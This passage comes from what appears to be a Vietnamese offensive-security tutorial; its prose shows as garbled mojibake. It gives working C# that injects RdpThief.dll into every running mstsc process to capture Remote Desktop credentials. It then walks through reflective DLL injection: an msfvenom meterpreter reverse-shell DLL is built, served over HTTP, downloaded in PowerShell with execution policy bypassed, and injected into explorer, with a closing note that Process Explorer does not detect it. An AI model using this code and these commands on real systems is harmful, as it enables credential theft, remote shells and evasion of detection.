    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    static void Main(string[] args) {

      String dllName = "C:\\Tools\\RdpThief.dll";

      while (true) {
        Process[] mstscProc = Process.GetProcessesByName("mstsc");
        if (mstscProc.Length > 0) {
          for (int i = 0; i < mstscProc.Length; i++) {
            int pid = mstscProc[i].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
          }
        }

        Thread.Sleep(1000);
      }
    }
   }
 }
```

Sau khi chÃºng ta thá»±c thi "mÃ£ Ä‘á»™c", nÃ³ sáº½ phÃ¡t hiá»‡n báº¥t cá»© session nÃ o Ä‘ang cháº¡y cá»§a `mstsc` vÃ  Ä‘Æ°a DLL Ä‘á»™c háº¡i vÃ o á»©ng dá»¥ng trÆ°á»›c khi ngÆ°á»i dÃ¹ng nháº­p thÃ´ng tin Ä‘Äƒng nháº­p. 

# 3. Reflective DLL Injection

* **Payload DLL**

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.130 LPORT=4444 -f dll -o /var/www/html/malware.dll
```
```
python -m http.server 8082 
```

[![pSqScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/pSqScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/pSqScreenshot_2.png)

* CÃ¡c bÆ°á»›c tiáº¿n hÃ nh


Má»Ÿ Powershell vá»›i tÃ¹y chá»n cho phÃ©p thá»±c thi script

```
PowerShell -Exec Bypass
```

Download DLL Payload

```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.138:8082/malware.dll')
```

TÃ¬m process Ä‘á»ƒ injection (trong trÆ°á»ng há»£p nÃ y lÃ  explorer)

```
$procid = (Get-Process -Name explorer).Id
```

Download `Invoke-ReflectivePEInjection` vÃ  thá»±c thi

```
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
> Output sáº½ bÃ¡o lá»—i Ä‘á» nhÆ°ng khÃ´ng sao cáº£ , payload váº«n hoáº¡t Ä‘á»™ng bÃ¬nh thÆ°á»ng  

[![74SScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/74SScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/74SScreenshot_2.png)

**Kiá»ƒm tra DLL Ä‘Ã£ tiÃªm trÃªn mÃ¡y náº¡n nhÃ¢n**

KhÃ´ng phÃ¡t hiá»‡n DLL `malware.dll` trÃªn `Process Explorer`

![](https://images.viblo.asia/cf746113-8960-430d-891c-da7c26fda1b3.png)